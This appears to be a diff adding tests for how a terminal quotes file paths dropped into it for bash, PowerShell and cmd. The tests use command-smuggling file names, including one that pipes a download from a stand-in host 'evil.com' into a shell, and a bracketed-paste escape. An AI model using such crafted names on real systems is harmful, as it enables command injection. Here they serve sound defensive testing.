@@ -3,9 +3,15 @@ import { commands } from "@/platform/ipc";
 import { usePlatform } from "@/platform/platformInfo";
 import { isRemoteWindow } from "@/platform/remote";
 import { handleFileDrop } from "@/workbench/fileDrop";
+import { dragSession, FILES_DRAG } from "@/ui";
 import { droppedPathsText, installTerminalDrop } from "./drop";
 
+const notify = vi.hoisted(() => vi.fn());
 vi.mock("@/platform/remote", () => ({ isRemoteWindow: vi.fn(() => false) }));
+vi.mock("@/workbench/contributions", async (importOriginal) => ({
+  ...(await importOriginal<typeof import("@/workbench/contributions")>()),
+  notifications: () => ({ notify }),
+}));
 
 const initialOs = usePlatform.getState().os;
 const originalElementFromPoint = document.elementFromPoint;
@@ -13,6 +19,7 @@ const originalElementFromPoint = document.elementFromPoint;
 beforeEach(() => {
   vi.stubGlobal("__TAURI_INTERNALS__", {});
   usePlatform.setState({ os: "macos" });
+  notify.mockClear();
 });
 
 afterEach(() => {
@@ -38,6 +45,75 @@ describe("terminal drop", () => {
       'C:\\plain\\file.ts "C:\\a b\\c.png" "C:\\it\'s here\\"',
     );
     expect(droppedPathsText(["C:\\a&b\\c.png"])).toBe('"C:\\a&b\\c.png"');
+  });
+
+  it("quotes a dropped path for the shell that reads it, not for the operating system", () => {
+    usePlatform.setState({ os: "windows" });
+    expect(droppedPathsText(["C:\\Users\\a$(calc).txt"], "pwsh")).toBe("'C:\\Users\\a$(calc).txt'");
+    expect(droppedPathsText(["C:\\Users\\a;calc;.txt"], "powershell")).toBe("'C:\\Users\\a;calc;.txt'");
+    expect(droppedPathsText(["C:\\Users\\a\u2019; calc; \u2018b.txt"], "pwsh")).toBe(
+      "'C:\\Users\\a\u2019\u2019; calc; \u2018\u2018b.txt'",
+    );
+    expect(droppedPathsText(["C:\\Users\\plain.txt", "C:\\Users\\a b.txt"], "pwsh")).toBe(
+      "C:\\Users\\plain.txt 'C:\\Users\\a b.txt'",
+    );
+    expect(droppedPathsText(["C:\\Users\\a&b.txt"], "cmd")).toBe('"C:\\Users\\a&b.txt"');
+    expect(() => droppedPathsText(["C:\\Users\\100%.txt"], "cmd")).toThrow(/cmd\.exe/);
+    expect(droppedPathsText(["/home/u/;{curl,evil.com}|sh;.txt"], "bash")).toBe("'/home/u/;{curl,evil.com}|sh;.txt'");
+  });
+
+  it.each(["macos", "linux"])("quotes POSIX metacharacters that a bare path would leave to the shell on %s", (os) => {
+    usePlatform.setState({ os });
+    expect(droppedPathsText(["/tmp/a;b"])).toBe("'/tmp/a;b'");
+    expect(droppedPathsText(["/tmp/a*b?[c]"])).toBe("'/tmp/a*b?[c]'");
+    expect(droppedPathsText(["/tmp/{a,b}", "/tmp/a|b", "/tmp/a&b", "/tmp/a(b)", "/tmp/a<b>"])).toBe(
+      "'/tmp/{a,b}' '/tmp/a|b' '/tmp/a&b' '/tmp/a(b)' '/tmp/a<b>'",
+    );
+  });
+
+  it("refuses a dropped path that has control characters", () => {
+    expect(() => droppedPathsText(["/tmp/a\nb"])).toThrow(/control characters/);
+    expect(() => droppedPathsText(["/tmp/a\x1b[201~b"], "zsh")).toThrow(/control characters/);
+  });
+
+  it("quotes for the shell of the terminal under the cursor", async () => {
+    usePlatform.setState({ os: "windows" });
+    const host = document.createElement("div");
+    const child = document.createElement("span");
+    host.append(child);
+    document.body.replaceChildren(host);
+    document.elementFromPoint = (() => child) as typeof document.elementFromPoint;
+    const paste = vi.fn();
+    const remove = installTerminalDrop(host, paste, () => ({ shell: "pwsh" }));
+    try {
+      await handleFileDrop(["C:\\Users\\a$(calc).txt"], 1, 1);
+      expect(paste.mock.calls).toEqual([["'C:\\Users\\a$(calc).txt'"]]);
+    } finally {
+      remove();
+    }
+  });
+
+  it("tells the user instead of pasting a path it cannot quote safely", async () => {
+    const host = document.createElement("div");
+    const child = document.createElement("span");
+    host.append(child);
+    document.body.replaceChildren(host);
+    document.elementFromPoint = (() => child) as typeof document.elementFromPoint;
+    const paste = vi.fn();
+    const remove = installTerminalDrop(host, paste, () => ({ shell: "zsh" }));
+    try {
+      const handled = handleFileDrop(["/tmp/a\nb"], 1, 1);
+      expect(handled).not.toBeNull();
+      await handled;
+      expect(paste).not.toHaveBeenCalled();
+      expect(notify).toHaveBeenCalledWith({
+        level: "error",
+        title: "Cannot paste the dropped files",
+        body: "Cannot paste this path safely: its name contains control characters.",
+      });
+    } finally {
+      remove();
+    }
   });
 
   it("pastes only into the host under the cursor without executing, regardless of registration order", async () => {
@@ -105,6 +181,25 @@ describe("terminal drop", () => {
       vi.mocked(isRemoteWindow).mockReturnValue(true);
       expect(handleFileDrop(["/local/file"], 1, 1)).toBeNull();
       expect(paste).not.toHaveBeenCalled();
+    } finally {
+      remove();
+    }
+  });
+
+  it("pastes paths dragged from the Project view, also in a remote window", () => {
+    vi.mocked(isRemoteWindow).mockReturnValue(true);
+    const host = document.createElement("div");
+    const child = document.createElement("span");
+    host.append(child);
+    document.body.replaceChildren(host);
+    document.elementFromPoint = (() => child) as typeof document.elementFromPoint;
+    const paste = vi.fn();
+    const remove = installTerminalDrop(host, paste);
+    try {
+      const drag = dragSession({ type: FILES_DRAG, payload: "/p/src/a b.ts\n/p/docs/" });
+      expect(drag.move(1, 1)).toBe(true);
+      expect(drag.drop(1, 1)).toBe(true);
+      expect(paste.mock.calls).toEqual([["'/p/src/a b.ts' /p/docs"]]);
     } finally {
       remove();
     }
